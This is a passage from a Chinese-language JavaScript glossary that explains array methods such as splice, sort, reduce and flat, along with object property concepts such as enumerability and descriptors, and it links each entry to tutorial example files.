`length` 不是普通属性，而是引擎维护的「**最大下标 + 1**」的魔法属性，并且**可写**：写它会直接改变数组结构。`arr.length = 2` 会**截断**（删掉下标 2 及之后的元素，是可变操作）；`arr.length = 5` 会**扩展**并把新增位置填成空洞；`arr.length = 0` 是清空数组的常用手法。非法值会抛 `RangeError`：负数、小数（如 `2.5`）、超过 2³²-1 的数。另一个要点是 `delete arr[i]` 只删属性、**不改变 length**，那个位置会变成空洞——它不是 `splice`（不前移），也不是 `pop`（不缩短），日常几乎总是错的写法。

也见 [Sparse Array and Hole（稀疏数组与空洞）](#sparse-array-and-hole稀疏数组与空洞)、[splice（拼接）](#splice拼接)。

示例：[`08_arrays/19_sparse_and_length.js`](08_arrays/19_sparse_and_length.js)

### delete Operator and Array（delete 与数组）

`delete arr[1]` 删除的是「下标 1 这个属性」，而不是「把元素摘出去」：数组 `length` **保持不变**，被删的位置变成空洞，后面的元素**不会前移**。这几乎永远不是你想要的效果——想按位置删除并前移用 `splice(i, 1)`，想删末尾用 `pop()`，想删首位用 `shift()`，想按值删除用 `filter`。`delete` 真正合适的场合是删除**对象的属性**（但同样会把属性变成「不存在」，而不是置为 `undefined`）；而对数组和 `Map`/`Set` 用 `delete` 就是典型的误用。

也见 [splice（拼接）](#splice拼接)、[Array length（数组的 length 属性）](#array-length数组的-length-属性)。

示例：[`08_arrays/19_sparse_and_length.js`](08_arrays/19_sparse_and_length.js)

### Mutating vs Non-mutating Methods（可变方法与不可变方法）

数组方法按「是否修改原数组」分成两派，这是数组 API 里最容易出错的一条分界线。**可变（mutating）**：`push`/`pop`/`shift`/`unshift`/`splice`/`sort`/`reverse`/`fill`/`copyWithin`；**非可变（non-mutating）**：`slice`/`concat`/`join`/`map`/`filter`/`reduce`/`flat`/`find`/`some`/`every`/`indexOf`/`includes`/`at`/`keys`/`values`/`entries`。关键细节：`sort` 和 `reverse` 的「可变」身份最容易被忘记，很多人以为它们在返回新数组，实际上原数组已被打乱；在 React 等依赖引用比较的框架里，这直接导致「改了状态但界面不更新」。ES2023 为这四个可变方法补齐了不可变版本（`toSorted`/`toReversed`/`toSpliced`/`with`）。

也见 [Array Copying Methods（数组拷贝方法）](#array-copying-methods数组拷贝方法)、[Chaining（链式调用）](#chaining链式调用)。

示例：[`08_arrays/02_push_pop_shift_unshift.js`](08_arrays/02_push_pop_shift_unshift.js)、[`08_arrays/13_reverse_and_fill.js`](08_arrays/13_reverse_and_fill.js)

### push, pop, shift, unshift（首尾增删）

四个「往两端加/减一个元素」的可变方法，都会修改原数组并返回不同东西：`push(...items)` 尾部添加、返回**新长度**；`pop()` 尾部删除、返回**被删元素**（空数组返回 `undefined`）；`unshift(...items)` 头部添加、返回**新长度**；`shift()` 头部删除、返回**被删元素**。关键细节：`push`/`pop` 是 O(1)，而 `unshift`/`shift` 需要**整体搬移所有元素**，是 O(n)——在循环里对大队列反复 `shift` 会退化成 O(n²)，这时应改用 `Map`、索引指针或专门的队列结构（见 `23_collections/`）。另外这四个方法都**不跳过空洞**，对稀疏数组操作的是位置本身。

也见 [splice（拼接）](#splice拼接)、[Mutating vs Non-mutating Methods（可变方法与不可变方法）](#mutating-vs-non-mutating-methods可变方法与不可变方法)。

示例：[`08_arrays/02_push_pop_shift_unshift.js`](08_arrays/02_push_pop_shift_unshift.js)

### slice（切片）

`arr.slice(start, end)` 返回一个**新的浅拷贝子数组**，含 `start`、不含 `end`，不修改原数组。两个参数都可省略：`slice()` 是整体浅拷贝，`slice(1)` 从下标 1 到末尾。负数下标表示「从末尾倒数」：`slice(-2)` 取最后两个，`slice(1, -1)` 去掉首尾各一个。关键细节：`start >= end` 时返回空数组（**不会自动交换参数**，这一点与字符串的 `substring` 相反）；参数是小数会先 `trunc`，`NaN` 当作 0。它的拷贝是**浅拷贝**，元素若为对象则新旧数组共享同一批引用。

**常见误解**：把 `slice` 当成「删除」——它从不修改原数组；想删除请用 `splice`。

也见 [splice（拼接）](#splice拼接)、[slice, substring, substr（子串截取）](#slice-substring-substr子串截取)、[Shallow Copy vs Deep Copy（浅拷贝与深拷贝）](#shallow-copy-vs-deep-copy浅拷贝与深拷贝)。

示例：[`08_arrays/03_slice.js`](08_arrays/03_slice.js)

### splice（拼接）

`arr.splice(start, deleteCount, ...items)` 是数组里**唯一能任意位置增删**的方法，它**修改原数组**并返回「被删除元素组成的新数组」。语义是「从 `start` 开始删掉 `deleteCount` 个，再在同样位置插入 `...items`」：`splice(i, 1)` 删一个，`splice(i, 0, x)` 纯插入，`splice(0)` 清空并拿到全部旧元素。关键细节：省略 `deleteCount` 表示「从 `start` 删到末尾」；`start` 可为负（从末尾数）；返回值**永远是被删的元素**，不是剩余数组，这是最常见的误解。与 `slice` 只差一个字母但语义完全相反——`slice` 只读不写、`splice` 只写（用返回值读）。

也见 [slice（切片）](#slice切片)、[Mutating vs Non-mutating Methods（可变方法与不可变方法）](#mutating-vs-non-mutating-methods可变方法与不可变方法)。

示例：[`08_arrays/04_splice.js`](08_arrays/04_splice.js)

### concat（连接）

`arr.concat(a, b, ...)` 把数组或单个值**拼成一个新数组**返回，不改原数组，也不改变任何输入。参数里的数组会被**展开一层**（不是递归展平），非数组值直接追加；`concat` 会保留稀疏数组的空洞。它是 ES6 之前的主力拼接手段，如今更推荐 `[...a, ...b]`（更短、语义直观），但 `concat` 有一个独门能力：**能正确处理「值是数组或不是数组」两种情况**——`[].concat(x)` 无论 `x` 是 `[1,2]` 还是 `1`，都能得到一个数组，这在写兼容多种输入的 API 时非常有用（`Array.prototype.flat` 的深度也仅一层，不要混淆）。

也见 [Object Spread（对象展开）](#object-spread对象展开)、[flat, flatMap（扁平化）](#flat-flatmap扁平化)。

示例：[`08_arrays/05_concat_and_join.js`](08_arrays/05_concat_and_join.js)

### join（连接成字符串）

`arr.join(separator)` 把每个元素转成字符串后用分隔符连成一个字符串，默认分隔符是 `","`（**不是空串**，这是常见误判）。它不修改原数组，是「数组 → CSV / 展示文本 / 路径」的标准手段。关键细节：`null` 和 `undefined` 元素会被转成**空字符串**（不是 `"null"`），这也是「用 `join` 实现 `repeat`」这种小技巧的基础（`new Array(n+1).join('*')`）；稀疏数组的空洞同样按空串处理。实际写 CSV 时要注意元素自身含分隔符、引号需要转义，`join` 不做任何转义。

也见 [split（分割）](#split分割)、[String（字符串）](#string字符串)。

示例：[`08_arrays/05_concat_and_join.js`](08_arrays/05_concat_and_join.js)

### indexOf, lastIndexOf（索引查找）

`arr.indexOf(value, fromIndex?)` 用**严格相等（`===`）**逐个比较，返回第一个匹配的下标，找不到返回 `-1`；`lastIndexOf` 从右往左找。关键限制有三条：一是**不能查 `NaN`**（因为 `NaN === NaN` 为假，`[NaN].indexOf(NaN)` 是 `-1`）；二是**不能查找对象内容**，只比较引用，`[{a:1}].indexOf({a:1})` 永远是 `-1`；三是**跳过稀疏数组的空洞**，所以 `[1, , 3].indexOf(undefined)` 返回 `-1`，而同场景的 `includes` 返回 `true`。返回值必须是 `-1` 而不是 `0` 或 falsy 判断，写成 `if (arr.indexOf(x))` 会在下标 0 处出错。

也见 [includes（包含判断）](#includes包含判断)、[find, findIndex, findLast, findLastIndex（查找）](#find-findindex-findlast-findlastindex查找)。

示例：[`08_arrays/06_index_of_and_includes.js`](08_arrays/06_index_of_and_includes.js)

### includes（包含判断）

`arr.includes(value, fromIndex?)` 返回布尔值，是「数组里有没有这个值」的首选写法。与 `indexOf` 的关键区别有两个：它使用 **SameValueZero** 比较，因此**能查到 `NaN`**（`[NaN].includes(NaN)` 为 `true`）；它**不跳过稀疏数组的空洞**，把空洞当 `undefined`（`[1, , 3].includes(undefined)` 为 `true`）。它依旧只做**引用比较**，不能按内容判断对象是否在数组里——那要用 `find`/`some` 或先映射成原始值。只关心「是否存在」时用 `includes`，需要下标时才用 `indexOf`。

也见 [indexOf, lastIndexOf（索引查找）](#indexof-lastindexof索引查找)、[some, every（存在与全称判断）](#some-every存在与全称判断)。

示例：[`08_arrays/06_index_of_and_includes.js`](08_arrays/06_index_of_and_includes.js)

### find, findIndex, findLast, findLastIndex（查找）

这四个方法接收**判断函数**而不是值，用于按条件查找：`find` 返回第一个满足条件的**元素**（找不到返回 `undefined`），`findIndex` 返回它的**下标**（找不到返回 `-1`）；`findLast`/`findLastIndex`（ES2023）从右往左找第一个匹配项，写「取最后一条待处理记录」时比先 `reverse` 再 `find` 干净得多。关键细节：回调签名是 `(element, index, array)`，可以在回调里用下标做判断；它们在找到第一个匹配后**立即停止遍历**（短路），因此对「大数组里查少数几个」比 `filter` 高效；与 `indexOf` 不同，它们**不跳过稀疏数组的空洞**，会把空洞当 `undefined` 交给回调。

也见 [filter（过滤）](#filter过滤)、[Callback Signature Pitfall（回调签名陷阱）](#callback-signature-pitfall回调签名陷阱)。

示例：[`08_arrays/06_index_of_and_includes.js`](08_arrays/06_index_of_and_includes.js)、[`08_arrays/19_sparse_and_length.js`](08_arrays/19_sparse_and_length.js)

### forEach（遍历）

`arr.forEach(callback)` 只是**遍历**：对每个元素调用一次回调，返回值恒为 `undefined`，并且**无法中途 `break`**（用 `return` 只能跳过本次迭代，相当于 `continue`）。因此它表达的是「为每一项做一件事」这种副作用操作，而不是「算出新数组」。它**跳过稀疏数组的空洞**（回调不会被空洞调用）。如果需要中途退出，应该用 `for...of`、`some`/`every`（靠返回 `true`/`false` 提前终止）或 `find`。回调签名是 `(element, index, array)`，第三个参数是原数组本身。

**常见误解**：以为 `forEach` 能像 `map` 一样收集结果——`const r = arr.forEach(f)` 得到的 `r` 永远是 `undefined`。

也见 [map（映射）](#map映射)、[Chaining（链式调用）](#chaining链式调用)。

示例：[`08_arrays/07_forEach.js`](08_arrays/07_forEach.js)

### map（映射）

`arr.map(callback)` 对每个元素调用回调，用**返回值**组成一个**等长新数组**，原数组不变。它是声明式数据变换的主力：一个元素进、一个元素出，个数绝不改变——如果你在回调里写 `if (...) return;`，对应位置会得到一个 `undefined` 而不是「被跳过」，这通常意味着你该用 `filter` 或 `flatMap`。关键细节：回调签名是 `(element, index, array)`；它**跳过稀疏数组的空洞**，且结果数组**保留空洞**；由于是浅拷贝，返回的新数组与原数组共享元素引用（改对象元素两边都会变）。另外 `map` 只接收一个参数时不能直接用 `parseInt` 之类的多参函数。

也见 [forEach（遍历）](#foreach遍历)、[Callback Signature Pitfall（回调签名陷阱）](#callback-signature-pitfall回调签名陷阱)、[flat, flatMap（扁平化）](#flat-flatmap扁平化)。

示例：[`08_arrays/08_map.js`](08_arrays/08_map.js)

### filter（过滤）

`arr.filter(predicate)` 用判断函数筛出满足条件的元素，返回**新数组**（长度 ≤ 原长度），原数组不变。回调返回真值即保留，返回假值即丢弃；签名是 `(element, index, array)`。关键细节：它**跳过空洞**；返回的是**浅拷贝**（元素引用共享）；`filter` 的结果可直接链式接 `map`/`reduce`。一个高频陷阱是用 `filter(x => x)` 做「去假值」，这会连 `0`、`''`、`false` 一起删掉——想只去 `null`/`undefined` 要写 `filter(x => x != null)`。另一个常见用途是「按值删除数组元素」，因为 JS 没有 `remove` 方法。

也见 [map（映射）](#map映射)、[Chaining（链式调用）](#chaining链式调用)。

示例：[`08_arrays/09_filter.js`](08_arrays/09_filter.js)

### reduce, reduceRight（归约）

`arr.reduce(reducer, initialValue?)` 把整个数组「折叠」成**一个值**，回调签名是 `(accumulator, element, index, array)`，每次返回的新累加值传入下一轮；`reduceRight` 只是把遍历方向反过来（从右到左）。它最灵活也最容易写错，三条要点必须记住：第一，**不给初始值时**，第一次迭代用 `arr[0]` 作累加器、从 `arr[1]` 开始——空数组不给初始值会抛 `TypeError`，所以**永远显式传初始值**；第二，它**跳过稀疏数组的空洞**；第三，累加器可以是任意类型（对象、数组、`Map`），所以求和、计数、分组、去重、构建索引都能用它表达。可读性上，若 `map`/`filter` 能表达清楚就别硬写 `reduce`。

也见 [Chaining（链式调用）](#chaining链式调用)、[Object.groupBy, Map.groupBy（分组）](#objectgroupby-mapgroupby分组)。

示例：[`08_arrays/10_reduce.js`](08_arrays/10_reduce.js)

### Chaining（链式调用）

链式调用指把多个**返回数组**的方法依次点下去：`arr.filter(...).map(...).reduce(...)`。它成立的前提是每个方法都返回数组（或至少返回可继续调用方法的对象），这也是 `sort`、`splice` 之类返回非数组的方法不能出现在链中间的原因。关键实践：把「筛选 → 变换 → 聚合」按此顺序排列，能避免对全量数据做昂贵变换；链式代码每行一个操作、可读性最好。两个注意点：一是链越长、中间数组越多，大数据量下内存与时间开销叠加，必要时用一次 `reduce` 合并；二是 `map`/`filter` 产生的都是**浅拷贝**，链上修改对象元素仍会影响外部引用。

也见 [map（映射）](#map映射)、[reduce, reduceRight（归约）](#reduce-reduceright归约)。

示例：[`08_arrays/21_chaining_practice.js`](08_arrays/21_chaining_practice.js)

### flat, flatMap（扁平化）

`arr.flat(depth = 1)` 按指定深度**摊平嵌套数组**，返回新数组；`depth` 可传 `Infinity` 完全摊平（此时它会**移除所有空洞**）。`arr.flatMap(fn)` 等价于「先 `map` 再 `flat(1)`」，但只遍历一次、性能更好，并且能实现「一变零或一变多」：回调返回数组就展开一层，返回非数组就当普通元素，返回 `[]` 就等于删掉这一项。关键细节：`flatMap` 的展开深度**固定为 1**，无法配置，超过一层要再链一次 `flat`；两者都不修改原数组；`flat` 在 `depth` 为 0 时返回浅拷贝，只有 `Infinity` 才保证消掉空洞。

也见 [map（映射）](#map映射)、[concat（连接）](#concat连接)。

示例：[`08_arrays/11_flat_and_flatMap.js`](08_arrays/11_flat_and_flatMap.js)

### sort（排序）

`arr.sort(compareFn?)` 对数组**就地排序并返回同一个数组引用**（可变操作，不是新数组）。最著名的坑是**默认行为**：不传比较函数时，元素会先被转成字符串再按 UTF-16 码元顺序比较，于是 `[10, 9, 1].sort()` 得到 `[1, 10, 9]`。因此**数字排序必须显式传比较函数** `(a, b) => a - b`。另外 `undefined` 和空洞总是被排到**最后**，且不会调用比较函数；`sort` 对稀疏数组只排序存在的元素。因为它是就地的，`[...arr].sort(...)` 或 `arr.toSorted(...)` 才是「拿一个排好序的副本」的正确写法。

也见 [Comparator（比较函数）](#comparator比较函数)、[Sort Stability（排序稳定性）](#sort-stability排序稳定性)、[Array Copying Methods（数组拷贝方法）](#array-copying-methods数组拷贝方法)。

示例：[`08_arrays/12_sort.js`](08_arrays/12_sort.js)

### Comparator（比较函数）

比较函数 `(a, b) => number` 是 `sort` 的「裁判」，规则是：返回**负数**表示 `a` 排在 `b` 前，返回**正数**表示 `a` 排在 `b` 后，返回 **0** 表示两者视为相等（保持相对顺序，依赖稳定性）。常用写法：数字升序 `(a, b) => a - b`、降序 `(a, b) => b - a`、字符串按人类语言 `(a, b) => a.localeCompare(b, 'zh-Hans-CN')`。多字段排序利用「第一个比较结果非 0 就短路」的技巧：`(a, b) => a.dept.localeCompare(b.dept) || b.score - a.score`。**最大的坑是「不一致的比较函数」**：如果裁判自相矛盾（比如 `return a > b`，返回布尔值而非数字），排序结果可能完全错乱甚至不终止——`true` 会被当成 `1`、`false` 当成 `0`，永远不返回负数。

也见 [sort（排序）](#sort排序)、[localeCompare（本地化比较）](#localecompare本地化比较)。

示例：[`08_arrays/12_sort.js`](08_arrays/12_sort.js)

### Sort Stability（排序稳定性）

排序稳定性指「**键值相等的元素，排序后是否保持原有相对顺序**」。ES2019 起规范**保证 `Array.prototype.sort` 是稳定的**，这带来一个非常实用的技巧：**先按次要字段排一次，再按主要字段排一次**，最终结果是「主要字段有序、主要字段相同时按次要字段有序」——因为第二次排序不会打乱第一次建立好的次序。稳定性也让「多级排序」可以不写复杂的比较函数。关键细节：稳定性的前提是你的比较函数**真的返回 0** 表示相等（返回布尔值的比较函数既不稳定也不正确）；历史上的实现（如老 V8）对短数组用插入排序（稳定）、对长数组用快排（不稳定），所以老代码里确实存在「换台机器结果就变」的现象。

也见 [Comparator（比较函数）](#comparator比较函数)、[sort（排序）](#sort排序)。

示例：[`08_arrays/12_sort.js`](08_arrays/12_sort.js)

### some, every（存在与全称判断）

`arr.some(fn)` 判断「是否**至少有一个**元素满足条件」，`arr.every(fn)` 判断「是否**所有**元素都满足条件」，都返回布尔值。两者都**短路**：`some` 遇到第一个真值立刻返回 `true`，`every` 遇到第一个假值立刻返回 `false`，因此**空数组**上 `some` 返回 `false`、`every` 返回 `true`（空真值，容易反直觉）。回调签名是 `(element, index, array)`，且都**跳过稀疏数组的空洞**——对稀疏数组，空洞既不会让 `some` 变真，也不会让 `every` 变假。它们常被用来替代「带 `break` 的 `for` 循环」，让意图更明确。

也见 [find, findIndex, findLast, findLastIndex（查找）](#find-findindex-findlast-findlastindex查找)、[includes（包含判断）](#includes包含判断)。

示例：[`08_arrays/14_some_and_every.js`](08_arrays/14_some_and_every.js)

### Array.prototype.at()（按索引取值）

`arr.at(i)` 按下标取一个元素，与 `arr[i]` 的唯一区别是**支持负数**：`arr.at(-1)` 取最后一个元素，`arr.at(-2)` 取倒数第二个。它解决的是「`arr[arr.length - 1]`」这种冗长写法的可读性问题，越界时返回 `undefined`（不抛错）。关键细节：`at` 是数组和字符串**都有**的方法（`String.prototype.at` 行为一致），所以在数组和字符串之间可以无脑通用；但它是**方法**而不是属性访问，在可选链里要写成 `arr?.at(-1)`；负数超出范围（如长度为 3 时 `at(-4)`）返回 `undefined`。

也见 [slice（切片）](#slice切片)、[String length（字符串长度陷阱）](#string-length字符串长度陷阱)。

示例：[`08_arrays/15_at_and_negative_index.js`](08_arrays/15_at_and_negative_index.js)

### Array Copying Methods（数组拷贝方法）

ES2023 为四个「可变方法」补上了**不可变版本**，统一返回新数组、绝不修改原数组：`toSorted(cmp)` 对应 `sort`，`toReversed()` 对应 `reverse`，`toSpliced(start, del, ...items)` 对应 `splice`，`with(index, value)` 对应「按下标替换单个元素」（下标可为负，越界抛 `RangeError`）。另外 `toReversed`/`toSorted` 会**保留稀疏数组的空洞**，而 `toSpliced`/`with` 会把空洞转成真 `undefined`。它们的实用价值在于「函数式风格 + 不可变状态」：在不希望改动原数组（React 状态、共享配置、参数校验）时，一行就能拿到副本，比 `[...arr].sort()` 更清晰。在旧环境（Node < 20、老浏览器）中使用需要转译或降级为展开运算符写法。

也见 [sort（排序）](#sort排序)、[Mutating vs Non-mutating Methods（可变方法与不可变方法）](#mutating-vs-non-mutating-methods可变方法与不可变方法)、[Shallow Copy vs Deep Copy（浅拷贝与深拷贝）](#shallow-copy-vs-deep-copy浅拷贝与深拷贝)。

示例：[`08_arrays/13_reverse_and_fill.js`](08_arrays/13_reverse_and_fill.js)、[`08_arrays/18_copy_array.js`](08_arrays/18_copy_array.js)

### Object.groupBy, Map.groupBy（分组）

ES2024 标准化的两个**静态**分组方法（提案里曾是 `arr.groupBy`，最终为避免与第三方库冲突改成静态方法，理由与 `Object.hasOwn` 相同）。`Object.groupBy(items, fn)` 返回一个**无原型（null 原型）对象**，键是回调返回值经「属性键转换」后的字符串或 Symbol；`Map.groupBy(items, fn)` 返回 `Map`，键保持原类型。这个差异是关键：用 `Object.groupBy` 按数字分组，键 `20` 会变成字符串 `'20'`，按键为对象分组则全部塌缩成 `'[object Object]'`——**要保留原始键类型必须用 `Map.groupBy`**。因为结果是无原型对象，`result.hasOwnProperty('x')` 会抛 `TypeError`，要用 `Object.hasOwn(result, 'x')`。分组回调签名是 `(element, index, array)`。

也见 [reduce, reduceRight（归约）](#reduce-reduceright归约)、[in, hasOwnProperty, Object.hasOwn（属性存在性判断）](#in-hasownproperty-objecthasown属性存在性判断)、[Object.create（创建）](#objectcreate创建)。

示例：[`08_arrays/20_grouping.js`](08_arrays/20_grouping.js)

### Shallow Copy vs Deep Copy（浅拷贝与深拷贝）

浅拷贝只复制**第一层的结构**，嵌套的对象/数组仍然是**共享引用**；深拷贝则递归复制所有层级，得到完全独立的副本。JS 里的 `[...arr]`、`arr.slice()`、`Object.assign({}, o)`、`{...o}`、`arr.toSorted()` 全是**浅拷贝**——改 `copy[0].x` 会同时改到原数组，这是最经典的「改了副本结果原数据也变了」事故。深拷贝的现代首选是 `structuredClone(value)`（内置，支持 `Map`/`Set`/`Date`/`ArrayBuffer`/循环引用，但**不能克隆函数、DOM 节点、原型链**）；老牌写法 `JSON.parse(JSON.stringify(o))` 虽然流行，却会丢掉 `undefined`、函数、Symbol 键，把 `Date` 变成字符串、把 `NaN` 变成 `null`，并遇到循环引用直接抛错。手写递归时还要单独处理循环引用，否则栈溢出。

也见 [Object.assign（合并）](#objectassign合并)、[Object Spread（对象展开）](#object-spread对象展开)、[Shallow Freeze vs Deep Freeze（浅冻结与深冻结）](#shallow-freeze-vs-deep-freeze浅冻结与深冻结)。

示例：[`08_arrays/18_copy_array.js`](08_arrays/18_copy_array.js)、[`09_objects/12_deep_clone.js`](09_objects/12_deep_clone.js)

### Callback Signature Pitfall（回调签名陷阱）

数组迭代方法调用回调时**不是只传一个参数**，而是固定传三个：`(元素, 下标, 数组本身)`。如果把一个「原本不是为当回调而设计」的函数直接传进去，它的形参会被按位置硬塞，参数含义冲突时就产生**不报错但结果错误**的静默 bug。最经典的是 `['1','2','3'].map(parseInt)` 得到 `[1, NaN, NaN]`：`map` 传的第 2 个参数是**下标**，而 `parseInt` 需要的第 2 个参数是**进制（radix）**，于是下标 0、1、2 被当成进制——0 视为十进制、进制 1 非法、二进制里没有 3。修复办法是包一层：`arr.map(s => parseInt(s, 10))` 或 `arr.map(Number)`。同理，`['a','b'].map(console.log)`、`arr.filter(Boolean)` 之外的 `arr.filter(某多参函数)`、`arr.reduce(某个双参函数)` 都可能中招——**凡是把现成函数直接当回调传，都要先确认参数个数和含义对得上**。

也见 [map（映射）](#map映射)、[parseInt, parseFloat（解析数字）](#parseint-parsefloat解析数字)、[forEach（遍历）](#foreach遍历)。

示例：[`08_arrays/22_callback_signature_pitfall.js`](08_arrays/22_callback_signature_pitfall.js)

## 对象（Object）

### Object Literal（对象字面量）

对象字面量 `{ key: value, ... }` 是创建对象最常用的方式，它描述的是「**键值对的无序集合**」（实际上是「有序的字符串/Symbol 键属性集合」，顺序规则见属性顺序）。字面量里可以写字符串/数字/计算属性名、可以用简写、可以定义方法、可以用 `get`/`set` 定义访问器，也支持展开运算符合并。关键细节：字面量的原型固定是 `Object.prototype`（想指定原型要用 `Object.create` 或 `__proto__` 字面量键）；用字面量创建的对象属性描述符默认全是「全开」（可写、可枚举、可配置）。常见的语法坑是**在语句位置写 `{ a: 1 }`** 会被解析成「带标签的块语句」而不是对象，必须用括号包起来：`({ a: 1 });`。

也见 [Property, Key, Value（属性、键与值）](#property-key-value属性键与值)、[Object.create（创建）](#objectcreate创建)。

示例：[`09_objects/01_object_literal.js`](09_objects/01_object_literal.js)

### Property, Key, Value（属性、键与值）

对象由**属性（property）**组成，每个属性是一个「键 → 值」的绑定。**键（key）**只能是**字符串或 Symbol**：写数字键 `{1: 'a'}` 会被自动转成 `'1'`；用对象当键会被转成 `'[object Object]'`（几乎总是 bug）。**值（value）**可以是任意类型，包括函数（此时这个属性常被称为方法）。属性还有三个隐藏开关：`writable`、`enumerable`、`configurable`（见属性描述符）。关键区分：属性既可能来自**自有属性**，也可能来自**原型链上的继承属性**，`obj.key` 会顺着原型链查找，而 `Object.keys` 只看自有的可枚举属性。需要非字符串键时应该用 `Map`（见 `23_collections/`）。

也见 [Own Property vs Inherited Property（自有属性与继承属性）](#own-property-vs-inherited-property自有属性与继承属性)、[Property Descriptor（属性描述符）](#property-descriptor属性描述符)。

示例：[`09_objects/01_object_literal.js`](09_objects/01_object_literal.js)

### Dot Access vs Bracket Access（点访问与方括号访问）

`obj.key`（点）和 `obj[key]`（方括号）都能读属性，差别在于**方括号里是表达式**，可以是变量、字符串拼接或任意计算结果，而点后面必须是**合法的标识符字面量**。因此「键名存在变量里」时必须用方括号：`obj[field]`；键名含空格、连字符或以数字开头时也必须用方括号：`obj['user-name']`、`obj['1']`。关键细节：`obj[1]` 与 `obj['1']` 是同一个属性（数字键会被转成字符串）；读取**不存在的属性**一律返回 `undefined`（不抛错），继续在 `undefined` 上取属性才会抛 `TypeError`，这就是可选链 `?.` 存在的意义；另外**赋值也适用同一套规则**，`obj[key] = v` 是动态写属性的标准手段。

也见 [Computed Property Name（计算属性名）](#computed-property-name计算属性名)、[in, hasOwnProperty, Object.hasOwn（属性存在性判断）](#in-hasownproperty-objecthasown属性存在性判断)。

示例：[`09_objects/02_property_access.js`](09_objects/02_property_access.js)

### Computed Property Name（计算属性名）

计算属性名指在对象字面量里用**方括号包一个表达式**作为键：`{ [key]: value }`，键在创建时求值，因此可以用变量、模板字符串、函数调用结果。它让「动态构造对象」从「先建空对象再逐条赋值」变成一行字面量，也让「属性简写 + 计算名」的组合非常自然：`{ [id]: { name, age } }` 就能一次构建索引表。关键细节：键表达式如果求值为对象，会被转成 `'[object Object]'`；求值为 `Symbol` 时会成为 Symbol 键（这是给对象挂「半私有」元数据的常用方式）；同一个字面量里计算名和普通键可以混用，重复的键**后者覆盖前者**。

也见 [Dot Access vs Bracket Access（点访问与方括号访问）](#dot-access-vs-bracket-access点访问与方括号访问)、[Shorthand Property and Method（属性简写与方法简写）](#shorthand-property-and-method属性简写与方法简写)。

示例：[`09_objects/03_computed_property_names.js`](09_objects/03_computed_property_names.js)

### Shorthand Property and Method（属性简写与方法简写）

两种把字面量写短的语法糖：**属性简写** `{ name }` 等价于 `{ name: name }`（键名取自变量名）；**方法简写** `{ greet() {} }` 等价于 `{ greet: function greet() {} }`。方法简写不只是短，它带来两个实质区别：简写方法**不能被当作构造函数**（没有 `[[Construct]]`，用 `new` 会抛错），并且它能使用 `super`（见 `09_objects/16_super_in_object_literals.js`），而 `greet: function() {}` 形式的**不是方法而是普通函数属性**，不能用 `super`。另外计算属性名可以和简写组合：`{ [name]: value }`，但**不能**写成 `{ [name] }`——简写只在键和变量同名时成立。

也见 [Computed Property Name（计算属性名）](#computed-property-name计算属性名)、[Object Literal（对象字面量）](#object-literal对象字面量)。

示例：[`09_objects/01_object_literal.js`](09_objects/01_object_literal.js)

### Own Property vs Inherited Property（自有属性与继承属性）

访问 `obj.x` 时，引擎先查对象**自身**的属性，找不到就沿 `[[Prototype]]` 链继续向上找，直到 `null`。**自有属性**是直接挂在该对象上的；**继承属性**来自原型链（例如所有普通对象都能用 `toString`，但它的 `hasOwnProperty('toString')` 为 `false`）。这个区别直接影响三件事：`Object.keys`/`values`/`entries`/`JSON.stringify` 只看**自有可枚举**属性；`for...in` 会**连继承的可枚举属性一起遍历**（所以必须配 `Object.hasOwn` 过滤）；判断「属性是否存在」时 `'x' in obj` 会把继承属性也算进去，想只查自有属性要用 `Object.hasOwn`。`__proto__`（访问器形式）和 `Object.getPrototypeOf` 是查看原型的入口。

也见 [in, hasOwnProperty, Object.hasOwn（属性存在性判断）](#in-hasownproperty-objecthasown属性存在性判断)、[Enumerable（可枚举性）](#enumerable可枚举性)、[Object.create（创建）](#objectcreate创建)。

示例：[`09_objects/02_property_access.js`](09_objects/02_property_access.js)、[`09_objects/11_object_has_own.js`](09_objects/11_object_has_own.js)

### in, hasOwnProperty, Object.hasOwn（属性存在性判断）

三种判断「属性是否存在」的手段，语义逐级不同：`'x' in obj` **包含原型链**（也能判断数组下标，如 `0 in arr` 是判断有无空洞的利器）；`obj.hasOwnProperty('x')` 只看自有属性，但它是**从原型链上继承来的方法**，所以对 `Object.create(null)` 创建的无原型对象会直接抛 `TypeError`，而且对象可以覆写它；`Object.hasOwn(obj, 'x')`（ES2022）是**静态方法**，只查自有属性且不受原型影响，是现在的推荐写法——它之所以做成静态方法而非 `obj.hasOwn`，正是为了避免与已有第三方库或用户属性冲突。注意：三者判断的都是「**属性是否存在**」，不是「值是否为 `undefined`」，`{a: undefined}` 对三者都返回「存在」。

也见 [Own Property vs Inherited Property（自有属性与继承属性）](#own-property-vs-inherited-property自有属性与继承属性)、[Sparse Array and Hole（稀疏数组与空洞）](#sparse-array-and-hole稀疏数组与空洞)。

示例：[`09_objects/11_object_has_own.js`](09_objects/11_object_has_own.js)

### Enumerable（可枚举性）

`enumerable` 是属性的三个开关之一，决定这个属性**是否会被「遍历类」操作看见**：`for...in`、`Object.keys`/`values`/`entries`、展开运算符 `{...o}`、`Object.assign`、`JSON.stringify` 都只处理可枚举属性；而 `Object.getOwnPropertyNames`、`Object.getOwnPropertyDescriptor`、直接属性访问 `obj.x` **不受它影响**。用字面量或赋值创建的属性默认 `enumerable: true`；用 `Object.defineProperty` 定义时**默认是 `false`**（这个默认值差异是高频坑）。标准库里很多「隐形」成员就是靠它实现：数组的 `length`、类的原型方法、`Symbol.iterator` 都是不可枚举的，所以不会出现在 `Object.keys` 或 `JSON.stringify` 里。

也见 [Property Descriptor（属性描述符）](#property-descriptor属性描述符)、[Object.keys, values, entries（键值遍历）](#objectkeys-values-entries键值遍历)。

示例：[`09_objects/08_property_descriptors.js`](09_objects/08_property_descriptors.js)

### Property Descriptor（属性描述符）

每个属性背后都有一份描述符对象，说明它「是什么、能不能改」：**数据属性**用 `{ value, writable, enumerable, configurable }`，**访问器属性**用 `{ get, set, enumerable, configurable }`。四个开关的含义是：`writable` 能否重新赋值；`enumerable` 是否出现在遍历与序列化中；`configurable` 能否 `delete`、能否**修改描述符**（一旦设为 `false` 就**不可逆**，且此时 `writable` 只能从 `true` 改成 `false`，不能反向）。用 `Object.defineProperty(obj, key, desc)` 单独定义，用 `Object.defineProperties` 批量定义，用 `Object.getOwnPropertyDescriptor(s)` 读取。关键默认值陷阱：`defineProperty` 未指定的开关**一律默认 `false`**，而在赋值/字面量里全默认 `true`——这解释了「为什么我用 `defineProperty` 加的属性 `Object.keys` 看不见」。

